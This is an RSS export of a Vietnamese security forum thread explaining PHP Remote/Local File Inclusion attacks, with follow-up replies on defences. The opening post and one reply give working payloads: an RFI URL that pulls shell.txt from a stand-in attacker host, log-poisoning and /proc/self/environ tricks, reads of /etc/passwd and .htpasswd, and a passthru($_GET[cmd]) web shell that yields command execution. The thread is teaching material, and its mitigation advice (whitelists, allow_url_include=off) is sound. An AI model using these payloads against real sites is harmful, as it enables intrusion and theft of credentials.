@@ -1,0 +1,381 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Giới thiệu tấn công Remote/Local File Inclusion"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Giới thiệu tấn công Remote/Local File Inclusion"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ <b>I. GIỚI THIỆU</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+include&#40;&quot;config.php&quot;&#41;;
+?&gt;</pre>
+		</div>
+Đoạn mã trên sẽ chèn nội dung của file config.php. Và có thể thực hiện chèn nội dung động nếu cung cấp một biến như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+include&#40;$page&#41;;
+?&gt;</pre>
+		</div>
+Lưu ý: Nếu trong cấu hình của PHP (php.ini), register_global mà thiết lập off thì biến $page không được coi như là một biến toàn cục và do vậy nó không thể thay đổi thông qua URL. Và câu lệnh include sẽ phải là $_GET[‘page’], $_POST[‘page’], $_REQUEST[‘page’] hoặc $_COOKIE[‘page’] thay vì $page.
+
+Giả sử trường hợp register_global được thiết lập và lúc này chúng ta sẽ thực hiện chèn trên URL với đối số bất kỳ, khi đó đoạn mã sẽ thực hiện include file mà chúng ta chỉ định, nếu không tồn tại thì sẽ báo lỗi nhưng vẫn thực hiện script. Một hàm khác của PHP đó là require hoặc require_once cũng có tác dụng tương tự như include nhưng nếu xuất hiện lỗi thì script sẽ ngừng. Sự khác biệt giữa include_once và include hoặc require_once và require là ở chỗ require_once hay include_once là ngăn chặn việc include hay require 1 file mà nhiều lần.
+
+Kiểm tra file robots.txt của website và thực hiện kiểm tra thử website đó với file robots.txt. Ví dụ www.example.com/page=robots.txt để xem cách ứng xử của server về câu truy vấn này.
+
+Có thể sử dụng Google CodeSearch để tìm kiếm các lỗi về File Inclusion bằng biểu thức chính qui như sau :<span class="link"> http://www.google.com/codesearch</span>
+lang:php (include|require)(_once)?\s*[‘”(]?\s*\$_(GET|POST|COOKIE)
+
+<b>II. KHAI THÁC</b>
+<b>1. Null-Byte</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>if &#40;isset&#40;$_GET&#91;'page'&#93;&#41;&#41;
+{
+include&#40;$_GET&#91;'page'&#93;.&quot;.php&quot;&#41;;
+}</pre>
+		</div>
+Nếu thực hiện index.php?page=/etc/passwd thì khi chèn vào thì nó sẽ là /etc/passwd.php, không đúng như chúng ta mong muốn, do vậy để khai thác và ngắt phần “.php” sử dụng %00(Null Byte), lúc này URL sẽ là index.php?page=/etc/passwd%00. Cách khai thác này chỉ có tác dụng khi magic_quotes_gpc=Off
+
+<b>2. Remote File Include</b>[/i]
+Nếu trong cấu hình của file php.ini mà allow_url_open=On và allow_url_include=On thì có thể thực hiện gộp file từ xa và trong nội dung file từ xa này có thể chứa các mã độc. Ví dụ
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.example.com/demo/index.php?page=http://www.hackerexample.com/shell.txt?</pre>
+		</div>
+<b>3. Local File Inclusion</b>
+Trường hợp mà allow_url_fopen =Off thì chúng ta không thể khai thác thông qua url từ xa, lúc này khai thác sẽ dựa trên local file inclusion. Khai thác local file cho phép chúng ta đọc các file nhạy cảm trên server, ví dụ như là /etc/passwd, /etc/group, httpd.conf, .htaccess, .htpasswd hoặc bất kỳ file cấu hình quan trọng nào.
+
+Ví dụ như có được thông tin từ /etc/passwd, kẻ tấn công có thể biết được các username có trên server và thực hiện bruteforce, nếu kẻ tấn công có khả năng truy cập shadow thì nguy hiểm hơn nhưng /etc/shadow thì chỉ có root mới có khả năng truy cập và đọc được file này.
+
+Ví dụ một số file nhạy cảm mà kẻ tấn công luôn muốn truy cập
+a. httpd.conf: Thực hiện đọc file này để có được thông tin về error_log, access_log, ServerName, DocumentRoot, …
+
+b. .htaccess và .htpasswd: Giả sử có một thư mục admin được bảo vệ bởi htaccess thì chúng ta không thể truy cập được các file .htaccess và .htpasswd trực tiếp, nhưng nếu bị lỗi local file inclusion thì có thể đọc và có được thông tin về username và password được thiết đặt ở trong những file này.
+
+c. Khai thác cục bộ
+Giả sử có nhiều website trên một server, nếu như site example1.com bị lỗi local file inclusion. Kẻ tấn công ở vị trí là website với domain là example2.com cũng cùng một server với example1.com thì có thể khai thác site example1.com này thông qua như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.example1.com/index.php?page=/home/example2/public_html/images/php.jpg</pre>
+		</div>
+d. Khai thác sử dụng Log Files
+Chuyện gì sẽ xảy ra nếu chúng ta đệ trình với URL như sau
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.example1.com/index.php?page=&lt;? echo phpinfo&#40;&#41;; ?&gt;</pre>
+		</div>
+Tất nhiên site sẽ thông báo lỗi bởi vì file &lt;? echo phpinfo(); ?&gt; không tồn tại, và khi đó trong error_log của Apache nó sẽ lưu thông tin về lỗi này như sau
+<blockquote>192.168.1.14 - - [15/Jul/2009:17:54:01 +0700] &quot;GET /demo/index.php?page=%3C?%20echo%20phpinfo();%20?%3E HTTP/1.1&quot; 200 492 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5&quot;&nbsp;
+		</blockquote>
+Như vậy trong file log đã encode URL mà chúng ta đệ trình, do vậy chúng ta cần phải gửi request với đoạn code sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+$res = '';
+$fp = fsockopen&#40;'127.0.0.1', 80&#41;;
+if&#40;!$fp&#41;{
+echo &quot;No connection&quot;;
+}
+fputs&#40;$fp, &quot;GET /demo/index.php?page=&lt;?php echo phpinfo&#40;&#41;;?&gt; HTTP/1.1\r\n&quot;&#41;;
+fputs&#40;$fp, &quot;Host: 127.0.0.1\r\n\r\n&quot;&#41;;
+while&#40;!feof&#40;$fp&#41;&#41;{
+$res .= fgets&#40;$fp, 128&#41;;
+}
+echo $res;
+?&gt;</pre>
+		</div>
+Sau khi thực hiện gửi request với đoạn mã như trên, thì hệ thống log sẽ ghi vào file log và chúng ta có thể thực hiện khai thác bằng cách:<span class="link"> http://example.com/demo/index.php?page=&lt;đường</span> dẫn đến file log&gt;
+Như vậy với việc đệ trình URL trên nó sẽ thực thi lệnh có trong file log
+
+e. Đặt PHP Script trong file JPEG
+Trong file jpg thì có phần Exif là phần đầu của file ảnh JPEG, mà nó ghi thông tin về, độ phân giải, ngày tạo, comment, … chúng ta có thể thực hiện chèn PHP script vào phần comment của file JPEG bằng công cụ jhead như sau: 
+./jhead –ce hack.jpg, nó sở mở vi cho chúng ta soạn thảo phần comment cho file JPEG, ở đây ta lưu comment với nội dung là &lt;? phpinfo(); ?&gt;. Và thực hiện upload ảnh lên server, nếu như server đó bị lỗi local file inclusion thì có thể thực hiện<span class="link"> http://www.example.com/index.php?page=hack.jpg,</span> khi đó mã PHP trong hack.jpg sẽ thực thi.
+
+f. Lỗi trong khi sử dụng các script để lưu log
+Ví dụ một đoạn mã sau lưu tấn công SQL Injection
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?
+$REQ = print_r&#40;$_REQUEST,true&#41;;
+$ip = 'IP: '.$_SERVER&#91;'REMOTE_ADDR'&#93;;
+$time = 'Date: '.date&#40;&quot;d.m.y - H:i:s&quot;&#41;;
+$ref = 'Referer: '.$_SERVER&#91;'HTTP_REFERER'&#93;;
+$browser = 'Browser: '.$_SERVER&#91;'HTTP_USER_AGENT'&#93;;
+if&#40;eregi&#40;'UNION',$REQ&#41; && eregi&#40;'SELECT',$REQ&#41;&#41;{
+$fp = fopen&#40;&quot;attacks.txt&quot;,&quot;a+&quot;&#41;;
+fwrite&#40;$fp,&quot;$REQ\n $ip\n $time\n $browser\n $ref\n&quot;&#41;;
+fclose&#40;$fp&#41;;
+header&#40;'Location:<span class="link"> http://www.google.com'&#41;;</span>
+}
+?&gt;</pre>
+		</div>
+Khi đó mọi hoạt động tấn công SQL Injection sẽ được lưu ở trong file attack.txt, tuy nhiên nếu kẻ tấn công đệ trình với URL như:
+UNION &lt;? phpinfo(); ?&gt;. Khi đó trong file log sẽ chứa thông tin về Reference và lúc này nếu server bị lỗi local file inclusion sẽ thực hiện được đoạn mã PHP với đệ trình sau:<span class="link"> http://example.com/index.php?page=attack.txt</span>
+
+g. Thực hiện PHP Code trong file /proc
+Mỗi tiến trình có một file trong thư mục /proc mà dùng để giao tiếp giữa kernel và user, tương ứng với mỗi thư mục mang số hiệu PID của mỗi tiến trình sẽ lưu thông tin về mỗi tiến trình mà nó thực hiện. Và có một file /proc/self/environ lưu thông tin về cấu hình mà nó đang hiện hành thực thi trên file mà không cần quan tâm PID. Do vậy nếu sử dụng Firefox để mở thì nó sẽ hiển thị thông tin liên quan đến Browser như là HTTP_USER_AGENT và HTTP_REFERER. Khi đó nếu website bị lỗi thì có thể thực hiện thiết đặt có chứa mã PHP và thực hiện gộp file để thực thi mã PHP<span class="link"> http://example.com/index.php?page=/proc/self/environ</span>
+
+<b>III. PHÒNG CHỐNG</b>
+Sử dụng hàm file_get_contents thay vì include đối với log bởi vì lúc này nó chỉ đọc nội dung của file mà không thực thi ngay cả đối với file php. Vô hiệu hóa hàm eval() trong PHP. Kiểm soát việc sử dụng require và include. Sử dụng đường dẫn tuyệt đối hơn là sử dụng .. hoặc / . Thiết đặt allow_url_fopen=off để chống RFI khi đó hàm file_get_contents cũng vô hiệu hóa theo đối với phiên bản PHP cũ &lt; 5.2.0. Nếu sử dụng PHP 5.2.0 thì thiết đặt allow_url_open=on nhưng allow_url_include=off, và thiết đặt register_global=off và thậm chí thiết lập display_errors=off
+
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226060</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226060</link>
+				<pubDate><![CDATA[Wed, 1 Dec 2010 05:58:20]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Cảm ơn anh. Bài viết rất hay.. 
+Mình mới tìm được cái video về RFI (Remove file include), bạn nào chưa hiểu lắm về RFI thì có thể xem 
+http://www.metacafe.com/watch/529101/php_rfi_solution/]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226099</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226099</link>
+				<pubDate><![CDATA[Wed, 1 Dec 2010 17:20:12]]> GMT</pubDate>
+				<author><![CDATA[ tanviet12]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Thanks anh seamoun về những bài viết tổng hợp rất hay.
+
+Em xin bổ xung thêm trong cách Khai thác sử dụng Log files
+Chuyển từ Local File Inclusion sang Remote Code Execution
+<p></p>
+		<cite class="blockquote">seamoun wrote:</cite><br>
+		<blockquote>
+d. Khai thác sử dụng Log Files
+Chuyện gì sẽ xảy ra nếu chúng ta đệ trình với URL như sau
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.example1.com/index.php?page=&lt;? echo phpinfo&#40;&#41;; ?&gt;</pre>
+		</div>
+&nbsp;
+		</blockquote>
+Thay vì sử dụng hàm phpinfo(), có thể sử dụng 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;? passthru&#40;$_GET&#91;cmd&#93;&#41; ?&gt;</pre>
+		</div>
+Khi đó file log sẽ có dạng
+<blockquote>192.168.1.14 - - [15/Jul/2009:17:54:01 +0700] &quot;GET /demo/index.php?page=&lt;? passthru($_GET[cmd]) ?&gt; HTTP/1.1&quot; 200 492 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5&quot;
+&nbsp;
+		</blockquote>
+Truy vấn đến log file theo URL:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://example.com/demo/index.php?page=&lt;đường dẫn đến file log&gt;</pre>
+		</div>
+Sẽ có thông báo lỗi:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Warning: passthru&#40;&#41; &#91;function.passthru&#93;: Cannot execute a blank command in 
+	/path/to/logfile.log  on line xxx</pre>
+		</div>
+Bây giờ có thể chạy lệnh như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://example.com/demo/index.php?page=.../path/to/logfile.log%00&cmd=ls -la</pre>
+		</div>
+Như vậy đã chuyển sang RCE
+
+@ tanviet12
+<p></p>
+		<cite class="blockquote">tanviet12 wrote:</cite><br>
+		<blockquote>Mình mới tìm được cái video về RFI (Remove file include), bạn nào chưa hiểu lắm về RFI thì có thể xem&nbsp;
+		</blockquote>
+RFI là Remote File Inclusion
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226525</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226525</link>
+				<pubDate><![CDATA[Mon, 6 Dec 2010 21:31:26]]> GMT</pubDate>
+				<author><![CDATA[ antiadmin]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ lolz, tui đâu thấy bồ antiadmin bổ sung gì đâu ?? Seamoun để phpinfo() chỉ là PoC mà :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226548</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226548</link>
+				<pubDate><![CDATA[Tue, 7 Dec 2010 01:28:38]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ mình nhớ có viết một cái auto LFI này thì phải, chi tiết xem ở đây:
+http://www.hvaonline.net/hvaonline/posts/list/32676.hva]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226549</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226549</link>
+				<pubDate><![CDATA[Tue, 7 Dec 2010 01:33:17]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote>lolz, tui đâu thấy bồ antiadmin bổ sung gì đâu ?? Seamoun để phpinfo() chỉ là PoC mà :D&nbsp;
+		</blockquote>
+
+ :D tùy bro nghĩ.
+Với tui nó khác, vì mở ra thêm 1 hướng mới. Tôi nghĩ các bạn mới tìm hiểu cũng thấy vậy.
+Nếu gamma95 có ý kiến gì hay thì cứ chia sẻ mọi người học hỏi lolz :D
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226552</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226552</link>
+				<pubDate><![CDATA[Tue, 7 Dec 2010 02:01:11]]> GMT</pubDate>
+				<author><![CDATA[ antiadmin]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote>mình nhớ có viết một cái auto LFI này thì phải, chi tiết xem ở đây:<span class="link"> http://www.hvaonline.net/hvaonline/posts/list/32676.hva&nbsp;</span>
+		</blockquote>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Thông tin
+ 
+Ối, bạn không đủ quyền truy cập chủ đề này.</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226606</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#226606</link>
+				<pubDate><![CDATA[Tue, 7 Dec 2010 10:17:37]]> GMT</pubDate>
+				<author><![CDATA[ phanledaivuong]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ mới có thêm một paper mô tả một kỹ thuật LFI mới và tổng kết sơ bộ các kỹ thuật cũ: http://gynvael.coldwind.pl/?id=376&lang=en
+
+-m ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#233666</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#233666</link>
+				<pubDate><![CDATA[Mon, 21 Mar 2011 12:58:46]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Theo em biết thì dùng:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+   $include = &quot;config.php&quot;;
+   include&#40;$include&#41;;
+?&gt;</pre>
+		</div>
+
+Thay vì:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+ include&#40;&quot;config.php&quot;&#41;;
+ ?&gt;</pre>
+		</div>
+Cũng không bị lỗi trên (em đọc trong tài liệu nhưng cũng chưa thử bao giờ lên không biết kết quả ra sao)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#234772</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#234772</link>
+				<pubDate><![CDATA[Tue, 5 Apr 2011 04:44:16]]> GMT</pubDate>
+				<author><![CDATA[ duongtnhat]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Thanks các bạn nhé !
+Bài viết rất có ích.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#241866</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#241866</link>
+				<pubDate><![CDATA[Thu, 23 Jun 2011 09:12:59]]> GMT</pubDate>
+				<author><![CDATA[ auauau97]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">duongtnhat wrote:</cite><br>
+		<blockquote>Theo em biết thì dùng:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+   $include = &quot;config.php&quot;;
+   include&#40;$include&#41;;
+?&gt;</pre>
+		</div>
+
+Thay vì:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+ include&#40;&quot;config.php&quot;&#41;;
+ ?&gt;</pre>
+		</div>
+Cũng không bị lỗi trên (em đọc trong tài liệu nhưng cũng chưa thử bao giờ lên không biết kết quả ra sao)&nbsp;
+		</blockquote>
+
+Nếu bạn đã ghi thẳng là <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;? include&#40;'absolute_file_name.php'&#41;; ?&gt;</pre>
+		</div> thì sẽ chẳng có vấn đề gì đâu. Người ta chỉ khai thác được khi bạn truyền vào trong hàm include 1 tên biến, ví dụ $include, mà tên biến này có thể bị override từ trong URL query.
+Còn cách giải quyết như bạn nói, khai báo $include ngay trước khi dùng, thì cũng tránh được URL query exploit, nhưng không khác gì so với bỏ string vào thẳng trong hàm include().]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246088</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246088</link>
+				<pubDate><![CDATA[Sun, 28 Aug 2011 09:50:22]]> GMT</pubDate>
+				<author><![CDATA[ khuongduybui]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Mình không nhớ lắm chỉ nhớ đã đọc về khai thác lỗi ở cái #include trong một cuốn sách nào đó 2-3 năm trước có nói dùng các của mình cũng tránh được lỗi Remote/Local File Inclusion mà?
+Mình chỉ nói thế, ai có cách nào hay hơn post lên cho ae học hỏi tí đi]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246095</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246095</link>
+				<pubDate><![CDATA[Sun, 28 Aug 2011 10:43:41]]> GMT</pubDate>
+				<author><![CDATA[ duongtnhat]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ Không phải nói cách của bạn không hiệu quả, mà thật ra là vầy. Bạn xem lại ngay bài đầu tiên của chủ đề người ta đã nói.
+Không chỉ dùng &lt;? include('config.php') ?&gt;, một số trang web còn dùng hàm include tự động cho các pages khác, ví dụ như $page hay 1 biến nào đó. Thí dụ như URL là &quot;/index.php?module=blog&quot; thì sẽ include(blog.php), nếu URL là &quot;/index.php?module=gallery&quot; thì sẽ include(gallery.php)...
+Như vậy nếu trang web code không kỹ, chỉ để là &lt;? include($_GET['module'].'.php') ?&gt; thì người ta sẽ lợi dụng điểm này, dùng URL là &quot;/index.php?module=a_secret_file&quot; để lấy được nội dung của cái &quot;a_secret_file.php&quot;, ví dụ vậy. Cụ thể thì bạn xem lại bài viết ở trên mình không nhắc nữa.
+
+Còn theo mình, nguyên tắc chung của security là blacklist hơn ở chỗ tiện dụng, whitelist hơn ở chỗ an toàn. Nếu là mình code trang kia, mình sẽ làm vầy.
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+$whitelisted_modules = {'blog', 'gallery', 'config', 'contact', 'about'};
+if&#40;in_array&#40;$_GET&#91;'module'&#93;,$whitelisted_modules&#41;&#41;
+{
+include&#40;$_GET&#91;'module'&#93;.'.php'&#41;;
+}
+else
+{
+//lưu vào log detected intrusion attempt, gồm timestamp, $_GET&#91;'module'&#93;, Client IP, Cookie content, ...
+//hiện thông báo lỗi
+//wwwect về trang chủ hoặc khoá IP hiện tại của client tuỳ admin strict tới cỡ nào
+}
+?&gt;</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246100</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#246100</link>
+				<pubDate><![CDATA[Sun, 28 Aug 2011 11:03:53]]> GMT</pubDate>
+				<author><![CDATA[ khuongduybui]]></author>
+			</item>
+			<item>
+				<title>Giới thiệu tấn công Remote/Local File Inclusion</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">duongtnhat wrote:</cite><br>
+		<blockquote>Mình không nhớ lắm chỉ nhớ đã đọc về khai thác lỗi ở cái #include trong một cuốn sách nào đó 2-3 năm trước có nói dùng các của mình cũng tránh được lỗi Remote/Local File Inclusion mà?
+Mình chỉ nói thế, ai có cách nào hay hơn post lên cho ae học hỏi tí đi&nbsp;
+		</blockquote>
+
+Quyển Essential Php Security :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/36793.hva#247017</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/36793.hva#247017</link>
+				<pubDate><![CDATA[Tue, 13 Sep 2011 03:22:55]]> GMT</pubDate>
+				<author><![CDATA[ LIA]]></author>
+			</item>
+	</channel>
+</rss>
